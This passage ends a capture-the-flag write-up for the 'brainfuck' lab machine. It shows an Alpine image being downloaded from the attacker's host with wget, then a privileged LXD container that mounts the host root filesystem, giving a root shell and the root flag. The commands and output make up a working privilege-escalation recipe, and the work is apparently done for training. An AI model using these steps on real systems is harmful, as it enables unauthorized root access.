(14/25) Installing ca-certificates-bundle (20230506-r0)
(15/25) Installing libcrypto3 (3.0.8-r4)
(16/25) Installing libssl3 (3.0.8-r4)
(17/25) Installing ssl_client (1.35.0-r29)
(18/25) Installing zlib (1.2.13-r0)
(19/25) Installing apk-tools (2.12.10-r1)
(20/25) Installing busybox-openrc (1.35.0-r29)
(21/25) Installing busybox-suid (1.35.0-r29)
(22/25) Installing scanelf (1.3.5-r1)
(23/25) Installing musl-utils (1.2.3-r4)
(24/25) Installing libc-utils (0.7.2-r3)
(25/25) Installing alpine-base (3.17.3-r0)
Executing busybox-1.35.0-r29.trigger
OK: 10 MiB in 25 packages

┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ ls
40611.c  41006.html  alpine-v3.17-x86_64-20230509_0856.tar.gz  a.out  build-alpine  id_rsa  linpeas.sh  ssh.hash
```

So, I send alpine-image from local machine to lab machine.

```sh
orestis@brainfuck:~$ wget http://10.10.14.32:8080/alpine-v3.17-x86_64-20230509_0856.tar.gz 
--2023-05-09 16:05:43--  http://10.10.14.32:8080/alpine-v3.17-x86_64-20230509_0856.tar.gz
Connecting to 10.10.14.32:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3768685 (3.6M) [application/gzip]
Saving to: ‘alpine-v3.17-x86_64-20230509_0856.tar.gz’

alpine-v3.17-x86_64-20230509_0856.tar.gz                   100%[========================================================================================================================================>]   3.59M  2.29MB/s    in 1.6s    

2023-05-09 16:05:45 (2.29 MB/s) - ‘alpine-v3.17-x86_64-20230509_0856.tar.gz’ saved [3768685/3768685]
```

Run alpine image.

```sh
orestis@brainfuck:~$ lxc image import ./alpine-v3.17-x86_64-20230509_0856.tar.gz --alias pwnimage
Image imported with fingerprint: f652d1703ebb3cedb39d7e125f8639a4c6989a7d84d50469b524d1743d28accd
orestis@brainfuck:~$ lxc image list
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| pwnimage | f652d1703ebb | no     | alpine v3.17 (20230509_08:56) | x86_64 | 3.59MB | May 9, 2023 at 1:07pm (UTC) |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
orestis@brainfuck:~$ lxc init pwnimage wolf -c security.privileged=true
Creating wolf
orestis@brainfuck:~$ lxc config device add wolf mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to wolf
orestis@brainfuck:~$ lxc start wolf
orestis@brainfuck:~$ lxc exec wolf /bin/sh
~ # whoami
root
~ # cd /mnt/root/root/
/mnt/root/root # cat root.txt 
```

I got root flag.
